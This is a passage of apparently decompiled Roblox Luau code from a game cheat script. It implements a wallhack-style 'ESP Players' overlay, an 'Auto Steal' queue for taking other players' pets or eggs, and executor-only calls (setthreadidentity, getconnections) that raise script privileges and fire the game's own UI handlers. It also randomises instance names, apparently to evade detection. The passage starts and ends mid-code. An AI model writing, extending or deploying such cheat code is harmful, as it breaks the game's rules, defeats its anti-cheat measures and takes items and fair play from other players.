				local n24 = visible and math.floor(math.clamp(fn17(name, n22) + 4, n22, 230)) or 0
				local n25 = 0
				local n26 = 0

				if visible2 then
					n26 = 0 + n20
				end

				local n27 = 0

				if visible then
					if n26 > 0 then
						n27 = n26 + n23
					else
						n27 = n26
					end

					n26 = n27 + n24
				end

				local n28 = 0

				if visible3 then
					if not (n26 > 0) then
						n28 = n26
					else
						n28 = n26 + n23
					end

					n26 = n28 + n21
				end

				local n29 = math.max(n26, 1)
				local n30 = 1 / n29
				local n31 = 1 / v19
				arg.Billboard.Size = UDim2.fromOffset(n29, v19)
				arg.Avatar.Visible = visible2
				arg.Name.Visible = visible
				arg.Shadow.Visible = visible
				arg.ToolIcon.Visible = visible3
				arg.ToolShadow.Visible = visible3
				arg.Avatar.Position = UDim2.fromScale(n25 / n29, 0.5)
				arg.Avatar.Size = UDim2.fromScale(n20 / n29, n20 / v19)
				arg.Name.Position = UDim2.fromScale(n27 / n29, 0.5)
				arg.Name.Size = UDim2.fromScale(n24 / n29, n22 / v19)
				arg.Shadow.Position = UDim2.fromScale(n27 / n29 + n30, 0.5 + n31)
				arg.Shadow.Size = arg.Name.Size
				arg.ToolIcon.Position = UDim2.fromScale(n28 / n29, 0.5)
				arg.ToolIcon.Size = UDim2.fromScale(n21 / n29, n21 / v19)
				arg.ToolShadow.Position = UDim2.fromScale(n28 / n29 + n30, 0.5 + n31)
				arg.ToolShadow.Size = arg.ToolIcon.Size
			end

			local function fn20(arg, adornee, arg2, arg3)
				local highlight = Instance.new("Highlight")
				highlight.Name = fn3()
				highlight.Adornee = adornee
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillColor = Color3.fromRGB(0, 67, 148)
				highlight.FillTransparency = 0.76
				highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
				highlight.OutlineTransparency = 0.02
				highlight.Parent = v15
				local v19 = arg3 or arg2
				local n20 = 3.1

				if v19 ~= arg2 then
					n20 = math.clamp(arg2.Position.Y - v19.Position.Y + 3.1, 3.8, 6)
				end

				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = fn3()
				billboardGui.Adornee = v19
				billboardGui.AlwaysOnTop = true
				billboardGui.LightInfluence = 0
				billboardGui.MaxDistance = math.huge
				billboardGui.Size = UDim2.fromOffset(1, 1)
				billboardGui.StudsOffsetWorldSpace = Vector3.new(0, n20, 0)
				billboardGui.Parent = v15
				local frame = Instance.new("Frame")
				frame.Name = fn3()
				frame.Size = UDim2.fromScale(1, 1)
				frame.BackgroundTransparency = 1
				frame.Parent = billboardGui
				local v20 = createImageLabel(frame, 2)
				v20.ScaleType = Enum.ScaleType.Crop
				local uiCorner = Instance.new("UICorner")
				uiCorner.Name = fn3()
				uiCorner.CornerRadius = UDim.new(1, 0)
				uiCorner.Parent = v20
				local v21 = createTextLabel(frame, 1)
				v21.TextColor3 = Color3.fromRGB(7, 19, 34)
				v21.TextTransparency = 0.05
				local v22 = createTextLabel(frame, 2)
				v22.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Name = fn3()
				fn18(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
				uiStroke.Parent = v22
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Name = fn3()
				uiGradient.Color = colorSequence2
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Name = fn3()
				uiGradient2.Color = v14
				uiGradient2.Rotation = 90
				uiGradient2.Parent = v22
				local v23 = createImageLabel(frame, 1)
				v23.ImageColor3 = Color3.fromRGB(0, 0, 0)
				v23.ImageTransparency = 0.35

				local tbl26 = {
					Player = arg,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = v20,
					Shadow = v21,
					Name = v22,
					ToolShadow = v23,
					ToolIcon = createImageLabel(frame, 2),
				}

				fn19(tbl26)
				return tbl26
			end

			local function fn21(arg)
				if arg.NameHumanoid and arg.NameHumanoid.Parent and arg.NameDistance ~= nil then
					pcall(function()
						arg.NameHumanoid.NameDisplayDistance = arg.NameDistance
					end)
				end

				arg.NameHumanoid = nil
				arg.NameDistance = nil
			end

			local function fn22(arg, arg2)
				local humanoid = arg2 and arg2:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end

				if arg.NameHumanoid ~= humanoid then
					fn21(arg)
					arg.NameHumanoid = humanoid
					arg.NameDistance = humanoid.NameDisplayDistance
				end

				pcall(function()
					humanoid.NameDisplayDistance = 0
				end)
			end

			local function fn23(arg)
				tbl6.DisconnectAll(arg.CharacterConnections)

				if arg.Tag then
					pcall(function()
						arg.Tag.Highlight:Destroy()
					end)

					pcall(function()
						arg.Tag.Billboard:Destroy()
					end)

					arg.Tag = nil
				end

				fn21(arg)
				arg.Character = nil
			end

			local function fn24(arg)
				if not arg.Tag or not arg.Character then
					return
				end
				local v19 = fn15(arg.Character:FindFirstChildOfClass("Tool"))
				arg.Tag.ToolIcon.Image = v19
				arg.Tag.ToolShadow.Image = v19
				fn19(arg.Tag)
			end

			local function fn25(arg, arg2, arg3)
				local image = tbl22[arg2.UserId]

				if image == nil then
					local ok

					ok, image = pcall(function()
						return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and image or ""
					tbl22[arg2.UserId] = image
				end

				if flag3 and arg.Version == arg3 and arg.Tag then
					arg.Tag.Avatar.Image = image
				end
			end

			local function fn26(arg, arg2, character)
				fn23(arg)
				arg.Version = arg.Version + 1
				local version = arg.Version
				if not flag3 or not character then
					return
				end
				arg.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not flag3 or arg.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not v15 or not v15.Parent then
						v15 = tbl6.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					arg.Tag = fn20(arg2, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					fn22(arg, character)

					local function fn27()
						task.defer(function()
							if flag3 and arg.Version == version then
								fn24(arg)
							end
						end)
					end

					table.insert(arg.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							fn27()
						elseif child:IsA("Humanoid") then
							fn22(arg, character)
						end
					end))

					table.insert(arg.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							fn27()
						end
					end))

					table.insert(arg.CharacterConnections, character.AncestryChanged:Connect(function()
						if arg.Version == version and not character:IsDescendantOf(workspace) then
							arg.Version = arg.Version + 1
							fn23(arg)
						end
					end))

					fn24(arg)
					fn25(arg, arg2, version)
				end)
			end

			local function fn27(player)
				local v19 = tbl20[player]
				if not v19 then
					return
				end
				v19.Version = v19.Version + 1
				fn23(v19)
				tbl6.DisconnectAll(v19.PlayerConnections)
				tbl20[player] = nil
			end

			local function fn28(player)
				if player == localPlayer or tbl20[player] then
					return
				end

				local tbl26 = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				tbl20[player] = tbl26

				table.insert(tbl26.PlayerConnections, player.CharacterAdded:Connect(function(character)
					fn26(tbl26, player, character)
				end))

				table.insert(tbl26.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if tbl26.Character == character then
						tbl26.Version = tbl26.Version + 1
						fn23(tbl26)
					end
				end))

				fn26(tbl26, player, player.Character)
			end

			local function fn29()
				for _, v19 in pairs(tbl20) do
					if v19.Tag then
						fn19(v19.Tag)
					end
				end
			end

			local function fn30()
				flag3 = false
				n18 += 1
				tbl6.DisconnectAll(tbl21)
				local tbl26 = {}

				for k in pairs(tbl20) do
					table.insert(tbl26, k)
				end

				for _, v19 in ipairs(tbl26) do
					fn27(v19)
				end

				if v15 then
					v15:Destroy()
					v15 = nil
				end
			end

			local function fn31()
				if flag3 then
					return
				end
				flag3 = true
				n18 += 1
				local v19 = n18
				v15 = tbl6.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					fn28(player)
				end

				table.insert(tbl21, Players.PlayerAdded:Connect(fn28))
				table.insert(tbl21, Players.PlayerRemoving:Connect(fn27))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(tbl21, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn29))
				end

				task.spawn(function()
					while true do
						if flag3 and v19 == n18 then
							task.wait(1)

							if not (not flag3 or v19 ~= n18) then
								for k, v20 in pairs(tbl20) do
									local character = k.Character
									local adornee = v20.Tag and v20.Tag.Billboard.Parent and v20.Tag.Billboard.Adornee and v20.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (v20.Character ~= character or not adornee) then
										fn26(v20, k, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function fn32()
				if flag5 then
					return
				end

				if tbl6.ReadToggle(v16, flag4) then
					fn31()
				elseif flag3 then
					fn30()
				end
			end

			fn4(function()
				flag5 = true
				fn30()
			end)

			v16 = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(arg)
					flag4 = arg == true
					tbl6.SyncSoon(fn32)
				end,
			})

			fn6(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = v16,
				Callback = function(arg)
					local tbl26 = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(arg) == "table" then
						for k, v19 in pairs(arg) do
							if type(v19) == "string" and tbl26[v19] ~= nil then
								tbl26[v19] = true
							elseif type(k) == "string" and v19 == true and tbl26[k] ~= nil then
								tbl26[k] = true
							end
						end
					end

					tbl23 = tbl26
					fn29()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = v16,
				Callback = function(arg)
					local num = tonumber(arg)

					if num and n19 ~= num / 100 then
						n19 = math.clamp(num / 100, 0.5, 2)
						fn29()
					end
				end,
			})
		end

		n = 3
		n2 = 0.002
		n3 = 4
		n4 = 0.3
		n5 = 0.62
		n6 = 0.86
		n7 = 4.4262295081967213
		n8 = 1.392
		n9 = 1.03
		tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService = game:GetService("TweenService")
		color2 = Color3.fromRGB

		fn8 = function(arg)
			local tbl24 = {}

			for i, v17 in ipairs(arg) do
				tbl24[i] = ColorSequenceKeypoint.new(v17[1], v17[2])
			end

			return ColorSequence.new(tbl24)
		end

		tbl8 = {}

		do
			local hud = {}
			local tbl24 = {}
			local tbl25 = { 0, color2(0, 118, 255) }
			local tbl26 = { 1, color2(72, 204, 255) }
			tbl24[1] = tbl25
			tbl24[2] = tbl26
			hud.Color = fn8(tbl24)
			hud.Rotation = -90
			hud.Stroke = color2(0, 28, 76)
			hud.Light = color2(172, 226, 255)
			tbl8.Hud = hud
		end

		do
			local steal = {}
			local tbl24 = {}
			local tbl25 = { 0, color2(60, 255, 0) }
			local tbl26 = { 1, color2(136, 255, 0) }
			tbl24[1] = tbl25
			tbl24[2] = tbl26
			steal.Color = fn8(tbl24)
			steal.Rotation = -90
			steal.Stroke = color2(11, 72, 0)
			steal.Light = color2(190, 255, 180)
			tbl8.Steal = steal
		end

		do
			local queued = {}
			local tbl24 = {}
			local tbl25 = { 0, color2(118, 118, 132) }
			local tbl26 = { 1, color2(172, 172, 186) }
			tbl24[1] = tbl25
			tbl24[2] = tbl26
			queued.Color = fn8(tbl24)
			queued.Rotation = -90
			queued.Stroke = color2(28, 28, 34)
			queued.Light = color2(214, 214, 226)
			tbl8.Queued = queued
		end
	end

	do
		local priorityOn = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(255, 247, 0) }
		local tbl11 = { 1, color2(255, 136, 0) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		priorityOn.Color = fn8(tbl9)
		priorityOn.Rotation = 90
		priorityOn.Stroke = color2(0, 0, 0)
		priorityOn.Light = color2(132, 112, 0)
		tbl8.PriorityOn = priorityOn
	end

	do
		local cancel = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(214, 17, 17) }
		local tbl11 = { 1, color2(253, 20, 20) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		cancel.Color = fn8(tbl9)
		cancel.Rotation = -90
		cancel.Stroke = color2(72, 0, 0)
		cancel.Light = color2(255, 103, 103)
		tbl8.Cancel = cancel
	end

	do
		local chilli = {}
		local tbl9 = {}
		local tbl10 = { 0, color2(132, 74, 255) }
		local tbl11 = { 0.34, color2(178, 74, 255) }
		local tbl12 = { 0.6, color2(255, 104, 206) }
		local tbl13 = { 0.78, color2(255, 168, 232) }
		local tbl14 = { 1, color2(146, 66, 255) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		tbl9[3] = tbl12
		tbl9[4] = tbl13
		tbl9[5] = tbl14
		chilli.Color = fn8(tbl9)
		chilli.Rotation = -115
		chilli.Stroke = color2(44, 10, 80)
		chilli.Light = color2(226, 178, 255)
		tbl8.Chilli = chilli
	end

	local fn9

	do
		local tbl9 = {}
		local tbl10 = { 0, color2(255, 255, 255) }
		local tbl11 = { 0.2, color2(206, 212, 224) }
		local tbl12 = { 0.42, color2(74, 80, 94) }
		local tbl13 = { 0.58, color2(42, 46, 56) }
		local tbl14 = { 0.78, color2(158, 166, 182) }
		local tbl15 = { 1, color2(250, 252, 255) }
		tbl9[1] = tbl10
		tbl9[2] = tbl11
		tbl9[3] = tbl12
		tbl9[4] = tbl13
		tbl9[5] = tbl14
		tbl9[6] = tbl15
		local v8 = fn8(tbl9)
		local tbl16 = {}
		local rarityGradients = nil

		fn9 = function(arg)
			local v9 = tbl16[arg]
			if v9 then
				return v9
			end
			local directory = tbl.Assets and tbl.Assets.Directory
			local flag = type(directory) == "table" and directory[arg] or nil
			local rarity = type(flag) == "table" and type(flag.Rarity) == "table" and flag.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local str

			if rarity then
				str = tostring(rarity.DisplayName or rarity._id or "")
			else
				str = rarity
			end

			str = str or ""
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
			local color4 = fn8({ { 0, color3 }, { 1, color3 } })
			local gradientRotation

			if string.upper(str) == "SECRET" then
				gradientRotation = 90
				color4 = v8
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					color4 = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(flag) == "table" and flag.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local tbl17 = {}
			local name = type(flag) == "table"

			if name then
				name = tostring(flag.DisplayName or arg)
			end

			tbl17.Name = name or tostring(arg)
			tbl17.Icon = icon and tostring(icon) or ""

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl17.RarityNumber = rarity or 0
			tbl17.GradientColor = color4
			tbl17.GradientRotation = gradientRotation
			tbl17.EarningRate = type(flag) == "table" and tonumber(flag.EarningRate) or 0
			tbl16[arg] = tbl17
			return tbl17
		end
	end

	local fn10

	fn10 = function(arg, arg2)
		local n10 = tonumber(arg.AssetScale) or 1
		local n11 = n10 > 5 and (n10 / 5) ^ 1.2 * 19.637875755794113 or n10 ^ 1.85
		local mutations = type(arg.Mutations) == "table" and arg.Mutations or {}

		if #mutations == 0 and type(arg.BaseMutation) == "string" and arg.BaseMutation ~= "" then
			mutations = { arg.BaseMutation }
		end

		local mutations2 = tbl.Mutations
		local flag = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
		local n12 = 1

		if flag then
			local ok
			ok, n12 = pcall(mutations2.EarningsFor, mutations)
			ok = ok and type(n12) == "number"
			local n13 = 1

			if not ok then
				n12 = n13
			end
		end

		return arg2.EarningRate * n11 * n12
	end

	local fn11
	local tbl9 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

	fn11 = function(arg)
		local n10 = tonumber(arg) or 0
		local n11 = 1

		while n10 >= 1000 and n11 < #tbl9 do
			n10 /= 1000
			n11 += 1
		end

		local str = n11 == 1 and tostring(math.floor(n10)) or string.format("%.1f", math.floor(n10 * 10) / 10)
		local str2 = tbl9[n11] .. "/s"
		return "$" .. string.gsub(str, "%.0$", "") .. str2
	end

	local fn12

	fn12 = function(arg, text)
		if arg and arg.Text ~= text then
			arg.Text = text
		end
	end

	local flag
	flag = false
	local n10
	n10 = 0
	local flag2
	flag2 = false
	local v8
	v8 = nil
	local v9
	v9 = nil
	local v10
	v10 = nil
	local imageLabel
	imageLabel = nil
	local v11
	v11 = nil
	local v12
	v12 = nil
	local position
	position = nil
	local title
	title = nil
	local v13
	v13 = nil
	local v14
	v14 = nil
	local v15
	v15 = nil
	local flag3
	flag3 = false
	local v16
	v16 = v2:CreateState({ Name = "Steal Panel Open", Default = true })
	local flag4
	flag4 = false
	local tween
	tween = nil
	local tween2
	tween2 = nil
	local n11
	n11 = 0
	local tbl10
	tbl10 = nil
	local tbl11
	tbl11 = nil
	local n12
	n12 = 1
	local tbl12
	tbl12 = {}
	local tbl13
	tbl13 = {}
	local tbl14
	tbl14 = {}
	local uiStroke, thickness, flag5, flag6, flag7, fn13, fn14, fn15, fn16, tbl15
	local fn17, fn18

	do
		local obj = setmetatable({}, { __mode = "k" })
		uiStroke = nil
		thickness = nil
		flag5 = false
		flag6 = false
		flag7 = false
		fn13 = nil

		fn14 = function()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local tbl16 = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and tbl16.Eggs and tbl16.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return tbl16
		end

		fn15 = function(arg)
			local ok, result = pcall(function()
				return arg:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		fn16 = function(arg)
			arg.Name = fn3()

			for _, descendant in ipairs(arg:GetDescendants()) do
				descendant.Name = fn3()
			end
		end

		local n13 = 2.3120369911193848
		local n14 = 556
		local n15 = 86.24
		tbl15 = { Panel = n13, Hud = n13 }

		local function fn19(arg)
			if arg then
				local x = v12 and v12.AbsoluteSize.X or 0
				return x > 0 and n13 * x / n14 or nil
			end
			local button = v10 and v10.Button
			local offset = button and button.Size.X.Offset or 0
			return offset > 0 and n13 * offset / n15 or nil
		end

		local function fn20(arg, arg2)
			local v17 = fn19(arg2.Panel)

			if v17 and arg.Parent then
				arg.Thickness = arg2.Ratio * v17
			end
		end

		fn17 = function(arg, arg2)
			local panel = arg2 and tbl15.Panel or tbl15.Hud

			if not panel or panel <= 0 then
				panel = 2.3120369911193848
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local tbl16 = { Ratio = descendant.Thickness / panel, Panel = arg2 == true }
						obj[descendant] = tbl16
						fn20(descendant, tbl16)
					end
				end
			end
		end

		fn18 = function()
			for k, v17 in pairs(obj) do
				fn20(k, v17)
			end
		end
	end

	local fn19

	fn19 = function()
		fn18()
	end

	local fn20

	fn20 = function(arg)
		if not arg then
			return nil
		end

		return {
			Button = arg,
			Gradient = arg:FindFirstChildOfClass("UIGradient"),
			Stroke = arg:FindFirstChild("UIStroke"),
			Light = arg:FindFirstChild("UIStrokeClr"),
			Label = arg:FindFirstChild("Label") or arg:FindFirstChild("TextLabel"),
			Scale = arg:FindFirstChild("BtnScale"),
		}
	end

	local fn21

	fn21 = function(arg, style)
		if not arg or arg.Style == style then
			return
		end
		arg.Style = style

		if arg.Gradient then
			arg.Gradient.Color = style.Color
			arg.Gradient.Rotation = style.Rotation
		end

		if arg.Stroke then
			arg.Stroke.Color = style.Stroke
		end

		if arg.Light then
			arg.Light.Color = style.Light
		end
	end

	local fn22

	fn22 = function(arg)
		if not arg then
			return
		end
		local scale = arg.Scale

		if not scale then
			scale = Instance.new("UIScale")
			scale.Parent = arg.Button
			arg.Scale = scale
		end

		local function fn23(arg2)
			TweenService:Create(scale, tweenInfo5, { Scale = arg2 }):Play()
		end

		arg.Button.MouseEnter:Connect(function()
			fn23(1.08)
		end)

		arg.Button.MouseLeave:Connect(function()
			fn23(1)
		end)

		arg.Button.MouseButton1Down:Connect(function()
			fn23(0.94)
		end)

		arg.Button.MouseButton1Up:Connect(function()
			fn23(1.08)
		end)
	end

	local fn23

	do
		local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tbl16 = {}

		fn23 = function(arg)
			for _, v17 in ipairs(tbl16) do
				pcall(function()
					v17:Cancel()
				end)
			end

			table.clear(tbl16)
			if not arg then
				return
			end

			local function fn24(arg2)
				tbl16[#tbl16 + 1] = arg2
				arg2:Play()
			end

			local gradient = arg.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				fn24(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
				fn24(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
			end

			local light = arg.Light

			if light then
				light.Color = color2(226, 178, 255)
				fn24(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
			end
		end
	end

	do
		local v17 = setthreadidentity or set_thread_identity

		local function fn24()
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local records = nil

				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
						records = result.Records
					end
				end)

				if type(v17) == "function" then
					pcall(v17, 8)
				end

				if records then
					return records
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local flag8 = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				flag8 = true
			end)

			local now = os.clock()

			while not flag8 and os.clock() - now < n3 do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function fn25()
			return v8 ~= nil and (v8.ActivePets and v8.ActivePets.Enabled or v8.GrowingEggs and v8.GrowingEggs.Enabled) or false
		end

		local function fn26()
			local flag8 = false

			for _, v18 in ipairs({ v8.ActivePets, v8.GrowingEggs }) do
				if v18 and v18.Enabled then
					local frame = v18:FindFirstChild("Frame")
					local close = frame and frame:FindFirstChild("Close")
					local flag9 = close and typeof(getconnections) == "function"
					local flag10 = false

					if flag9 then
						local ok, result = pcall(getconnections, close.Activated)
						ok = ok and type(result) == "table"
						local flag11 = false

						if ok then
							local v19, v20, v21 = ipairs(result)
							local flag12 = false

							for _, v22 in v19, v20, v21 do
								if pcall(function()
									v22:Fire()
								end) then
									flag12 = true
								end
							end

							flag10 = flag12
						else
							flag10 = flag11
						end
					end

					if not flag10 then
						v18.Enabled = false
					end

					flag8 = true
				end
			end

			return flag8
		end

		local function fn27(arg, arg2)
			local column = v8 and v8.Column
			if not column or not column.Parent then
				return
			end

			if tween2 then
				tween2:Cancel()
				tween2 = nil
			end

			local position2 = column.Position
			local udim2 = UDim2.new(position2.X.Scale, arg and math.ceil(column.AbsoluteSize.X * n9) or 0, position2.Y.Scale, position2.Y.Offset)
			if arg2 then
				column.Position = udim2
				return
			end
			tween2 = TweenService:Create(column, arg and tweenInfo3 or tweenInfo4, { Position = udim2 })
			tween2:Play()
		end

		local n13 = 0.106
		local udim2 = UDim2.new(0.955, 0, 0.6, 0)
		local udim22 = UDim2.new(0.955 - n13, 0, 0.6, 0)
		local udim23 = UDim2.new(0.2, 0, 0.56, 0)
		local n14 = 0.955 - n13

		local function fn28(arg, visible)
			if arg and arg.Button.Visible ~= visible then
				arg.Button.Visible = visible
			end
		end

		local function fn29(arg, rank, badgeStyle, arg2)
			local visible = rank ~= nil
			arg.Rank = rank
			fn28(arg.Steal, not visible)
			fn28(arg.Up, visible)
			fn28(arg.Down, visible)
			fn28(arg.Cancel, visible)

			if visible then
				fn21(arg.Up, rank > 1 and tbl8.Hud or tbl8.Queued)
				fn21(arg.Down, rank < (arg2 or rank) and tbl8.Hud or tbl8.Queued)
			end

			fn21(arg.Star, rank == 1 and tbl8.PriorityOn or tbl8.Queued)

			if arg.Badge then
				if arg.Badge.Visible ~= visible then
					arg.Badge.Visible = visible
				end

				if visible then
					fn12(arg.Badge, "#" .. rank)
					badgeStyle = badgeStyle and tbl8.Steal or tbl8.PriorityOn

					if arg.BadgeStyle ~= badgeStyle and arg.BadgeGradient then
						arg.BadgeStyle = badgeStyle
						arg.BadgeGradient.Color = badgeStyle.Color
						arg.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function fn30()
			if not tbl10 then
				return
			end
			local v18 = tbl4.Toggle(v5, false)

			if tbl10.On ~= v18 then
				tbl10.On = v18
				fn21(tbl10.Toggle, v18 and tbl8.Steal or tbl8.Cancel)
				fn12(tbl10.Toggle.Label, v18 and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			if v13 and tbl10.SortShown ~= v4 then
				tbl10.SortShown = v4
				fn12(v13.Label, "Sort: " .. tostring(v4))
			end
		end

		local n15 = 4
		local tbl16 = {}
		local tbl17 = {}

		local function fn31()
			if not v14 then
				return
			end
			fn30()
			local tbl18 = {}

			for _, v18 in pairs(tbl13) do
				table.insert(tbl18, v18)
			end

			local tbl19 = {}
			local v18 = nil

			if type(tbl4.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(tbl4.StealPlan)

					if ok and type(result) == "table" then
						tbl19 = result
						v18 = result2
					end
				end)
			end

			local tbl20 = {}

			for i, v19 in ipairs(tbl19) do
				if tbl20[v19] == nil then
					tbl20[v19] = i
				end
			end

			local v19 = v4

			table.sort(tbl18, function(arg, arg2)
				local v20 = tbl20[arg.Uid]
				local v21 = tbl20[arg2.Uid]
				if v20 ~= nil ~= v21 ~= nil then
					return v20 ~= nil
				end

				if v20 and v21 then
					return v20 < v21
				end

				if v19 == tbl5[1] and arg.Style.RarityNumber ~= arg2.Style.RarityNumber then
					return arg.Style.RarityNumber > arg2.Style.RarityNumber
				end
				local flag8 = v19 == tbl5[2]

				if flag8 then
					flag8 = (arg.Weight or 0) ~= (arg2.Weight or 0)
				end

				if flag8 then
					return (arg.Weight or 0) > (arg2.Weight or 0)
				end

				if v19 == tbl5[5] and arg.Value ~= arg2.Value then
					return arg.Value < arg2.Value
				end

				if arg.Value ~= arg2.Value then
					return arg.Value > arg2.Value
				end
				return arg.Uid < arg2.Uid
			end)

			local now = os.clock()
			local tbl21 = {}
			local tbl22 = {}

			for _, v20 in ipairs(tbl18) do
				local v21 = tbl16[v20.Uid]

				if v21 and v21 > now and tbl17[v20.Uid] then
					table.insert(tbl22, v20)
				else
					tbl16[v20.Uid] = nil
					table.insert(tbl21, v20)
				end
			end

			table.sort(tbl22, function(arg, arg2)
				return tbl17[arg.Uid] < tbl17[arg2.Uid]
			end)

			for _, v20 in ipairs(tbl22) do
				table.insert(tbl21, math.clamp(tbl17[v20.Uid], 1, #tbl21 + 1), v20)
			end

			table.clear(tbl17)

			for i, v20 in ipairs(tbl21) do
				tbl17[v20.Uid] = i
				local v21 = tbl12[v20.Uid]

				if v21 then
